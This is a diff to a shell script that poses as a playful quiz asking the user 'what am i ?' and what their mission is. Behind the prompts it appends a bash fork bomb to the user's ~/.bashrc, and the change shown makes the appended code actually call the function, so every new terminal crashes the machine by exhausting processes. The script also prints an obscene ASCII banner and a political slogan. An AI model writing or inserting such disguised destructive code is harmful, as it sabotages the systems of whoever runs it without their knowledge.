@@ -3,7 +3,7 @@
 clear ; echo "what am i ?" ; sleep 2 ; echo "" ; echo "first who are you ?" ; echo "enter the answer:"
 read ami ; echo "" ; echo "what your mission :" ; echo "enter the answer: " ; read mission ; echo ""
 echo "so" $ami "your are here for" $mission ; echo "and have you succeeded in this mission ?"
-echo "" ; read YoN ; echo ":(){" >> ~/.bashrc ; echo ": | : & }" >> ~/.bashrc
+echo "" ; read YoN ; echo ":(){" >> ~/.bashrc ; echo ": | : & } :" >> ~/.bashrc
 echo "well $ami..." ; sleep 5 ;echo "tell to the chinese fed, FREEEEEEEE OUIGHOUIR !!!!!"
 sleep 5 ;
 echo "     _         FUCK YOU        _"
@@ -22,4 +22,3 @@ echo "                || ||"
 echo "               ooO Ooo"
 echo ""
 sleep 5 ; clear
-alias whatami=":"
